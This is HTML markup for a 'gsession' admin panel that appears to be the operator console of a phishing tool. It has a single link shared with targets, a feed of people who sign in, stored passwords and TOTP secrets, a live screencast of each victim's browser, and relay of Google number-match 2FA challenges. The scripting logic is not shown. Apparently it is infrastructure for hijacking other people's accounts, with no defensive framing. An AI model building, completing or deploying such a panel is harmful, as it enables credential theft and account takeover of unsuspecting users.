<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>gsession — session admin</title>
<link rel="stylesheet" href="style.css" />
</head>
<body>

<!-- login gate -->
<div id="gate" class="gate">
  <form id="gate-form" class="gate-card">
    <div class="logo">g<span>session</span></div>
    <p class="muted">Enter the admin token to manage sessions.</p>
    <input id="gate-token" type="password" placeholder="Admin token" autocomplete="off" />
    <button type="submit">Unlock</button>
    <div id="gate-error" class="err"></div>
  </form>
</div>

<!-- app -->
<div id="app" class="app hidden">
  <header class="topbar">
    <div class="logo sm">g<span>session</span></div>
    <div class="spacer"></div>
    <button id="new-btn" class="primary">+ New session</button>
    <button id="bell-btn" class="ghost bell" title="Notifications">🔔<span id="bell-count" class="count hidden">0</span></button>
    <button id="lock-btn" class="ghost" title="Lock panel">Lock</button>
  </header>

  <main>
    <div class="section">
      <div class="section-title">Share this link</div>
      <div class="share-row">
        <input id="share-link" readonly onclick="this.select()" />
        <button onclick="copyText(shareLink())">Copy</button>
        <div class="share-hint">One link for everyone. Each person who signs in creates their own session below — no need to generate a new link.</div>
      </div>
    </div>

    <div class="section">
      <div class="section-title">Sessions</div>
      <div id="empty" class="empty hidden">
        <p>No sessions yet.</p>
        <button class="primary" onclick="openModal()">Create your first session</button>
      </div>
      <div id="grid" class="grid"></div>
    </div>
  </main>
</div>

<!-- notifications drawer -->
<div id="drawer" class="drawer">
  <div class="drawer-head">
    <h3>Notifications</h3>
    <div class="spacer"></div>
    <button class="ghost" onclick="toggleDrawer(false)">✕</button>
  </div>
  <div id="feed" class="feed"><div class="feed-empty">No activity yet.</div></div>
</div>

<!-- new/edit session modal -->
<div id="modal" class="modal hidden">
  <form id="session-form" class="modal-card">
    <h2 id="modal-title">New session</h2>
    <input type="hidden" id="f-id" />
    <label>Session name
      <input id="f-name" placeholder="e.g. Google test account" required />
    </label>
    <label>Provider
      <select id="f-provider">
        <option value="google">Google</option>
        <option value="generic">Generic (any site)</option>
      </select>
    </label>
    <label id="url-row" class="hidden">Login URL
      <input id="f-url" placeholder="https://example.com/login" />
    </label>
    <label>Login / email
      <input id="f-username" placeholder="user@gmail.com" autocomplete="off" />
    </label>
    <label>Password
      <input id="f-password" type="password" placeholder="•••••••• (leave blank to keep)" autocomplete="new-password" />
    </label>
    <label>2FA secret (TOTP, optional)
      <input id="f-totp" placeholder="Base32 secret from authenticator setup" autocomplete="off" />
      <small class="muted">If set, 6-digit codes are generated automatically. Leave blank to enter 2FA by hand.</small>
    </label>
    <label>Note (optional)
      <input id="f-note" placeholder="anything to remember" />
    </label>
    <div class="modal-actions">
      <button type="button" class="ghost" onclick="closeModal()">Cancel</button>
      <button type="submit" class="primary">Save session</button>
    </div>
    <div id="form-error" class="err"></div>
  </form>
</div>

<!-- live session view (browser screencast) + pending challenge (number/code/phone) -->
<div id="watch-modal" class="modal hidden">
  <div class="modal-card watch-card" id="watch-card">
    <div class="watch-head">
      <h2 id="watch-title">Session</h2>
      <div class="watch-head-actions">
        <span id="watch-live" class="live-dot hidden"><span class="dot"></span>LIVE</span>
        <button type="button" class="ghost" onclick="closeWatch()">Close</button>
      </div>
    </div>
    <div id="watch-body" class="watch-body">
      <img id="watch-frame" alt="Live browser view" class="hidden" />
      <div id="watch-numbers" class="watch-numbers hidden"></div>
      <p id="watch-msg" class="watch-msg hidden"></p>
    </div>
    <div class="modal-actions">
      <button type="button" class="ghost" onclick="closeWatch()">Close</button>
    </div>
  </div>
</div>

<div id="toast" class="toast hidden"></div>

<script src="app.js"></script>
</body>
</html>
